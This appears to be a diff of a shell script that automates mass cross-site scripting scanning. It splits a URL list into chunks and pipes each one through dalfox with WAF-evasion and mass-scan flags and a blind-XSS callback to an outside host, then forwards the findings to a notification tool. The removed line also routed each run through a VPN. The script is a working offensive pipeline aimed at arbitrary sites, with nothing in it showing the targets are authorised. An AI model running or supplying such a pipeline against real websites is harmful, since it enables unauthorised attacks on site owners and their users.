@@ -56,7 +56,7 @@ split -l 300 urls.txt small_file
 # Iterate over each smaller file
 for file in small_file*; do
     # Execute your script for each file
-    nordvpn connect && cat "$file" | qs FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://k0l.uk -o results.tmp && cat results.tmp | anew results.txt; sleep 60
+    cat "$file" | qs FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://k0l.uk -o results.tmp && cat results.tmp | notify -silent -id Confidential-Exif1, Confidential-Exif2 | anew results.txt
 done
 
 # Cleanup: remove the smaller files
